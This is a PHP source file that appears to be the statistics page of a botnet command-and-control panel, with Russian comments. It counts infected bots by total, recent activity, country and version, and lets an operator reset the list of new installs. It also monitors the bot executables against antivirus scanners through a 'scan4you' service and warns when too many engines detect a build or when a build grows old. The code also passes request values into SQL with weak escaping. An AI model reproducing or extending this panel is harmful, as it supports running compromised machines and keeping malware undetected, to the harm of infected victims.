<?php if(!defined('__CP__'))die();

define('COUNTRYLIST_WIDTH', 200);  //Ширина колонки стран.
define('STAT_WIDTH',        '1%'); //Ширина колонки статистики.

require_once 'system/lib/db.php';
require_once 'system/lib/dbpdo.php';
require_once 'system/lib/guiutil.php';

$CRON = require_once 'system/cron.php'; /** CronJobsMan $CRON */


if (isset($_GET['ajax'])){
	switch ($_GET['ajax']){
		case 'avirscan-manual':
			$CRON->manual_run('cronjobs_files::cronjob_avirscan_files', array('id' => $_GET['id']));
			# nonstop
		case 'avirscan-results':
			$R = mysql_q(mkquery('SELECT `scan_details` FROM `exe_updates` WHERE `id`={i:id};' , $_GET));
			print array_shift(mysql_fetch_assoc($R));
			break;
		case 'botnet_activity':
			$db = dbPDO::singleton();
			$q = $db->prepare(
				'SELECT
				    `ba`.`date`,
				    COUNT(*) AS `bots_active`,
				    (SELECT COUNT(DISTINCT `botId`) FROM `botnet_activity` WHERE `date` >= `ba`.`date`) AS `bots_total`
				 FROM `botnet_activity` `ba`
				 WHERE
				    (:date IS NULL OR `ba`.`date`>=:date)
				 GROUP BY `ba`.`date`
				 ORDER BY `ba`.`date` DESC;
				 ;');
			$q->setFetchMode(PDO::FETCH_OBJ);
			$q->execute(array(
				':date' => isset($_GET['days'])? date('Y-m-d', time()-$_GET['days']*60*60*24) : null,
			));

			echo '<table class="lined zebra">';
			echo '<THEAD><tr>',
				'<th>', LNG_STATS_ACTIVITY_TH_DATE, '</th>',
				'<th>', LNG_STATS_ACTIVITY_TH_TOTAL, '</th>',
				'<th>', LNG_STATS_ACTIVITY_TH_ACTIVE, '</th>',
				'<th>', LNG_STATS_ACTIVITY_TH_PERCENT, '</th>',
				'</tr></THEAD>';
			echo '<TBODY>';
			foreach ($q as $row){
				echo '<tr>';
				echo '<td>', $row->date, '</td>';
				echo '<td>', $row->bots_total, '</td>';
				echo '<td>', $row->bots_active, '</td>';
				echo '<td>', round(100*$row->bots_active/$row->bots_total), '</td>';
				echo '</tr>';
			}
			echo '</TBODY>';
			echo '</table>';
			break;
		}
	die();
	}


//Очистка списка Инсталлов.
if(isset($_GET['reset_newbots']) && !empty($userData['r_stats_main_reset']))
{
  $query = 'UPDATE `botnet_list` SET `flag_new`=0';
  if(!empty($_GET['botnet']))$query .= " WHERE `botnet`='".addslashes($_GET['botnet'])."'";
  mysqlQueryEx('botnet_list', $query);

  if(empty($_GET['botnet']))header('Location: '.QUERY_STRING);
  else header('Location: '.QUERY_STRING.'&botnet='.urlencode($_GET['botnet']));

  die();
}

//Текущий ботнет.
define('CURRENT_BOTNET', (!empty($_GET['botnet']) ? $_GET['botnet'] : ''));

///////////////////////////////////////////////////////////////////////////////////////////////////
// Вывод общей информации.
///////////////////////////////////////////////////////////////////////////////////////////////////
$output = '';
if ($GLOBALS['userData']['r_stats_main']){
$i = 0;
$output = str_replace('{WIDTH}', (COUNTRYLIST_WIDTH * 2).'px', THEME_LIST_BEGIN).
          str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_STATS_TOTAL_INFO), THEME_LIST_TITLE);

//Подсчет количества отчетов в базе данных
if(!empty($userData['r_reports_db']))
{
  $reportsList  = listReportTables($config['mysql_db']);
  $reportsCount = 0;
  foreach($reportsList as $table)if(($mt = @mysql_fetch_row(mysqlQueryEx($table, "SELECT COUNT(*) FROM `{$table}`"))))$reportsCount += $mt[0];
  $output .= 
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_REPORTS),              $i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, numberFormatAsInt($reportsCount)), $i % 2 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1).
  THEME_LIST_ROW_END;
  $i++;
}

/* check cron */
if (!$CRON->is_configured()){
	$output .= '<tr><td><div id="cron_warning">';
	$output .= '<div>'.LNG_CRON_WARNING.'</div>';
	$output .= '<pre>'.$CRON->crontab('system/cron.php', 'cron').'</pre>';
	$output .= '<div>'.LNG_CRON_WARNING_DESCR.'</div>';
	$output .= '</div></td></tr>';
	}

$output .= getBotnetStats('', $i).THEME_LIST_END.THEME_STRING_NEWLINE;
}
///////////////////////////////////////////////////////////////////////////////////////////////////
// File hashes & Scan results
///////////////////////////////////////////////////////////////////////////////////////////////////

if ($CRON->is_configured()) # only if configured
	$CRON->manual_run('cronjobs_files::cronjob_files_discover');

// Display files list & check results
$output .= str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(4, LNG_STATS_EXELIST), THEME_LIST_TITLE);
$output .= '<tr><td>';

$R = mysql_q('SELECT * FROM `exe_updates` ORDER BY `ctime` DESC;');

$i=0;
$output .= '<table id="files-list">';
while ($R && !is_bool($r = mysql_fetch_assoc($R))){
	$tr_class = (++$i % 2 ? 'td_c1' : 'td_c2');
	$output .= '<tr class='.$tr_class.'>';
	# File
	$output .= '<td><a class="ajax_colorbox" href="?'.mkuri().'&ajax=avirscan-manual&id='.$r['id'].'" title="'.$r['hash'].'">'.$r['file'].'</a></td>';
	# Scan restuls
	$output .= '<td>';
	if ($r['scan_count'] == 0)
		$output .= '<span class="avirscan-never">'.LNG_STATS_EXELIST_NAVIR.'</span>';
		else
		$output .='<a class="ajax_colorbox" href="?'.mkuri().'&ajax=avirscan-results&id='.$r['id'].'" title="'.( date('d.m.Y H:i:s', $r['scan_date']) ).'">'
					.$r['scan_threat'].'/'.$r['scan_count'].LNG_STATS_EXELIST_VIRUS
					.'</a>';
	$output .= '</td>';
	# Age
	$age = round((time() - $r['mtime']) / (60*60*24));
	$output .= '<td><span title="'.LNG_STATS_EXELIST_DAYSHINT.'">'.$age.LNG_STATS_EXELIST_DAYS.'</span></td>';
	# Monitoring interval
	$output .= '<td><small>'.date('d.m.Y H:i:s', $r['ctime']).' — '.date('d.m.Y H:i:s', $r['mtime']).'</small></td>';

	# Warnings
	if ($age >= 3)
		$output .= '<tr><td colspan=4 class="'.$tr_class.' file_alert">'.LNG_STATS_EXELIST_AGEALERT.'</td></tr>';
	if ($r['scan_threat'] >= 6)
		$output .= '<tr><td colspan=4 class="'.$tr_class.' file_alert">'.LNG_STATS_EXELIST_AVIRALERT.'</td></tr>';

	$output .= '</tr>';
	continue;


	$filenamestring = '<a class="avirscan-manual" href="'.mkuri().'&ajax=avirscan-manual&id='.$r['id'].'" title="'.$r['hash'].'">'.$r['file'].'</span>';
	$agestring = '<span title="'.LNG_STATS_EXELIST_DAYSHINT.'">'.$age.LNG_STATS_EXELIST_DAYS.'</span>';
	$ctime_mtime = date('d.m.Y H:i:s', $r['ctime']).' — '.date('d.m.Y H:i:s', $r['mtime']);
	
	if ($r['scan_count']>0){
		$avir_scan = '<a class="avirscan-line" href="#avirscan'.$r['id'].'" '
				.'title="'.( date('d.m.Y H:i:s', $r['scan_date']) ).'">'
				.$r['scan_threat'].'/'.$r['scan_count'].LNG_STATS_EXELIST_VIRUS
				.'</a>';
		$avir_scan_results .= '<div id="avirscan'.$r['id'].'" class="avirscan-results avirscan-hidden">';
		$avir_scan_results .= $r['scan_details'];
		$avir_scan_results .= '</div>';
		} else
		$avir_scan = '<a class="avirscan-line avirscan-never" href=".avirscan-cron">'.LNG_STATS_EXELIST_NAVIR.'</a>';
	
	$ltd = $r['id'] % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1;
	$rtd = $r['id'] % 2 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1;
	
	$output .= 
		THEME_LIST_ROW_BEGIN.
			str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $filenamestring), $ltd).
			str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $avir_scan), $rtd).
			str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $agestring), $rtd).
			str_replace(array('{WIDTH}', '{TEXT}'), array('300px', "<small>$ctime_mtime"), $rtd).
		THEME_LIST_ROW_END;
	if ($age >= 3)
		$output .= '<tr><td colspan=4 class="td_c'.(1 + $r['id']%2).' file_alert">'.LNG_STATS_EXELIST_AGEALERT.'</td></tr>';
	if ($r['scan_threat'] >= 6)
		$output .= '<tr><td colspan=4 class="td_c'.(1 + $r['id']%2).' file_alert">'.LNG_STATS_EXELIST_AVIRALERT.'</td></tr>';
	}

$output .= '</table>';
$output .= '</tr></td>';
$output .= THEME_LIST_END;

if ($GLOBALS['userData']['r_stats_main']){
	$output .= '<div align=right>';
	$output .= '<a href="?m=ajax_config&action=scan4you" class="ajax_colorbox" />'.LNG_STATS_EXELIST_SETUP.'</a> ';
	$output .= '</div>';
	}

$output .= THEME_STRING_NEWLINE;

///////////////////////////////////////////////////////////////////////////////////////////////////
// Вывод информации об текущем ботнете.
///////////////////////////////////////////////////////////////////////////////////////////////////
if ($GLOBALS['userData']['r_stats_main']){
$actionList = '';
if(!empty($userData['r_stats_main_reset']))
{
  $actionList = str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_STATS_BOTNET_ACTIONS.THEME_STRING_SPACE.
                            str_replace(array('{TEXT}',     '{JS_EVENTS}'),
                                        array(LNG_STATS_RESET_NEWBOTS, ' onclick="if(confirm(\''.addJsSlashes(LNG_STATS_RESET_NEWBOTS_Q).'\'))window.location=\''.QUERY_STRING_HTML.'&amp;reset_newbots&amp;botnet='.addJsSlashes(urlencode(CURRENT_BOTNET)).'\';"'),
                                        THEME_DIALOG_ITEM_ACTION
                                       )),
                            THEME_DIALOG_TITLE);
}

$output .= 
str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_STATS_BOTNET.THEME_STRING_SPACE.botnetsToListBox(CURRENT_BOTNET, '')), THEME_DIALOG_TITLE).
$actionList;

//Сбор статистики для конкретного ботнета.
if(CURRENT_BOTNET != '')
{
  $output .=
    THEME_DIALOG_ROW_BEGIN.
      str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ITEM_CHILD_BEGIN).
        str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
          getBotnetStats(CURRENT_BOTNET, 0).
        THEME_LIST_END.
      THEME_DIALOG_ITEM_CHILD_END.
    THEME_DIALOG_ROW_END;
}

//Вывод списка стран.
$commonQuery = ((CURRENT_BOTNET != '') ? ' AND botnet=\''.addslashes(CURRENT_BOTNET).'\'' : '');
$output .= 
THEME_DIALOG_ROW_BEGIN.  
  str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
    listCountries(LNG_STATS_COLUMN_NEWBOTS, '`flag_new`=1'.$commonQuery).
  THEME_DIALOG_ITEM_CHILD_END.
  str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
    listCountries(LNG_STATS_COLUMN_ONLINEBOTS, '`rtime_last`>=\''.(CURRENT_TIME - $config['botnet_timeout']).'\''.$commonQuery).
  THEME_DIALOG_ITEM_CHILD_END.
THEME_DIALOG_ROW_END.
THEME_DIALOG_END;
}

ThemeBegin(LNG_STATS, 0, 0, 0);
echo $output;
ThemeEnd();

///////////////////////////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Создание информации по ботнету.
  
  IN $botnet - string, название ботнета.
  IN  $i     - int, счетчик номера строки.
  
  Return    - string, часть таблицы.
*/
function getBotnetStats($botnet, $i)
{
  $query1 = '';
  $query2 = '';
  
  if($botnet != '')
  {
    $botnet = addslashes($botnet);
    $query1 = " WHERE `botnet`='{$botnet}'";
    $query2 = " AND `botnet`='{$botnet}'";
  }
  
  //Количетсво ботов, и время первого отчета.
  $tmp = htmlEntitiesEx(($mt = @mysql_fetch_row(mysqlQueryEx('botnet_list', "SELECT MIN(`rtime_first`), COUNT(`bot_id`), MIN(`bot_version`), MAX(`bot_version`) FROM `botnet_list`{$query1}"))) && $mt[0] > 0 ? gmdate(LNG_FORMAT_DT, $mt[0]) : '-');
  $data =
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_FIRST_BOT), $i == 0 ? THEME_LIST_ITEM_LTEXT_U1 : THEME_LIST_ITEM_LTEXT_U2).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, $tmp),            $i == 0 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2). //Пусть будет num.
  THEME_LIST_ROW_END.
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_BOTS),          $i == 0 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, numberFormatAsInt($mt[1])), $i == 0 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1).
  THEME_LIST_ROW_END;

  $totalBots  = $mt[1];
  $minVersion = $mt[2];
  $maxVersion = $mt[3];

  //Количетсво ботов активных за последнии 24 часа.
  $tmp = ($mt = @mysql_fetch_row(mysqlQueryEx('botnet_list', 'SELECT COUNT(`bot_id`) FROM `botnet_list` WHERE `rtime_last`>='.(CURRENT_TIME - 86400).$query2))) ? $mt[0] : 0;
  $totalBots = '<a href="#" id="tr-botnet_activity">'.($totalBots > 0 ? numberFormatAsFloat(($tmp * 100) / $totalBots, 2) : 0).'% -  '.numberFormatAsInt($tmp).'</a>';
  $data .= 
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_BOTS24),   $i == 0 ? THEME_LIST_ITEM_LTEXT_U1 : THEME_LIST_ITEM_LTEXT_U2).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, $totalBots),           $i == 0 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2).
  THEME_LIST_ROW_END;

	$data .=
			'<tr><td id="botnet_activity" style="display: none;">
			<h3>' . LNG_STATS_ACTIVITY . '</h3>
			<ul class="tabs">
				<li><a href="?'.mkuri(1,'m').'&ajax=botnet_activity&days=7">' . LNG_STATS_ACTIVITY_7DAYS . '</a></li>
				<li><a href="?'.mkuri(1,'m').'&ajax=botnet_activity&days=14">' . LNG_STATS_ACTIVITY_14DAYS . '</a></li>
				<li><a href="?'.mkuri(1,'m').'&ajax=botnet_activity&days=30">' . LNG_STATS_ACTIVITY_30DAYS . '</a></li>
				</ul>
			<div class="display">
				</div>
			</td></tr>
			';

 
  //Максимальная и минимальная версия бота.
	$botVersions = intToVersion($minVersion) . ' — '.intToVersion($maxVersion);
	$botVersions = '<a href="#" id="botVersions">'.$botVersions.'</a>';
  $data .= 
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_VERSIONS),   $i == 0 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, $botVersions), $i == 0 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1).
  THEME_LIST_ROW_END;

	require_once "system/lib/db.php";
	require_once "system/lib/guiutil.php";

	$data .= jsonset(array('window.botVersions' => array()));

	foreach (array(
		         0 => 0, # all
		         1 => time()-60*60*24, # day
		         2 => time()-60*60*24*7, # week
		         3 => time()-60*60*24*31 # month
	         ) as $id => $rtime_last){
		$R = mysql_q(mkquery(
				'SELECT
					`bot_version` AS `v`,
					COUNT(*) AS `n`
				 FROM `botnet_list`
				 WHERE `rtime_last` >= {i:rtime_last}
				 GROUP BY `v`
				 ORDER BY `n` DESC, `v` DESC
				 ', array(
				'rtime_last' => $rtime_last
				)));
		$versions = array();
		while ($R && !is_bool($r = mysql_fetch_assoc($R)))
			$versions[] = array(intToVersion($r['v']), (int)$r['n']);

		$data .= jsonset(array('window.botVersions['.$id.']' => $versions));
	}

	$ul = '';
	$ul .= '<li><a href="#" data-id="0">'.LNG_STATS_TOTAL_VERSIONS_ALL.'</a>';
	$ul .= '<li><a href="#" data-id="1">'.LNG_STATS_TOTAL_VERSIONS_DAY.'</a>';
	$ul .= '<li><a href="#" data-id="2">'.LNG_STATS_TOTAL_VERSIONS_WEEK.'</a>';
	$ul .= '<li><a href="#" data-id="3">'.LNG_STATS_TOTAL_VERSIONS_MONTH.'</a>';

	$data .= <<<HTML
<tr><td id="botVersions-td" style="display:none;">
		<div id="botVersions-Display" class="clearfix">
			<div class="pie"></div>
			<div class="table"></div>
			</div>
		<ul class="period">
			$ul
			</ul>
	</td></tr>

<script type="text/javascript" src="https://www.google.com/jsapi"></script>
<script src="theme/js/page-stats_main.js"></script>
HTML;

  
  return $data;
}

/*
  Создание таблицы со списом стран.
  
  IN $name  - string, название таблицы.
  IN $query - string, дополнительные условия для SQL-запроса.
  
  Return    - string, таблица.
*/
function listCountries($name, $query)
{
  $data = str_replace('{WIDTH}', COUNTRYLIST_WIDTH.'px', THEME_LIST_BEGIN);

  $r = mysqlQueryEx('botnet_list', 'SELECT `country`, COUNT(`country`) FROM `botnet_list` WHERE '.$query.' GROUP BY BINARY `country` ORDER BY COUNT(`country`) DESC, `country` ASC');
  if($r && @mysql_affected_rows() > 0)
  {
    //Составляем список.
    $count = 0;
    $i     = 0;
    $list  = '';

    while(($m = mysql_fetch_row($r)))
    {
      $list .=
      THEME_LIST_ROW_BEGIN.
        str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($m[0])),   $i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1).
        str_replace(array('{WIDTH}', '{TEXT}'), array('8em', numberFormatAsInt($m[1])), $i % 2 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1).
      THEME_LIST_ROW_END;

      $count += $m[1];
      $i++;
    }

    //Заголовок
    $data .= str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, sprintf($name, numberFormatAsInt($count))), THEME_LIST_TITLE).$list;
  }
  //Ошибка.
  else
  {
    $data .= 
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, sprintf($name, 0)), THEME_LIST_TITLE).
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, $r ? LNG_STATS_COUNTRYLIST_EMPTY : mysqlErrorEx()), THEME_LIST_ITEM_EMPTY_1).
    THEME_LIST_ROW_END;
  }
  
  return $data.THEME_LIST_END;
}
?>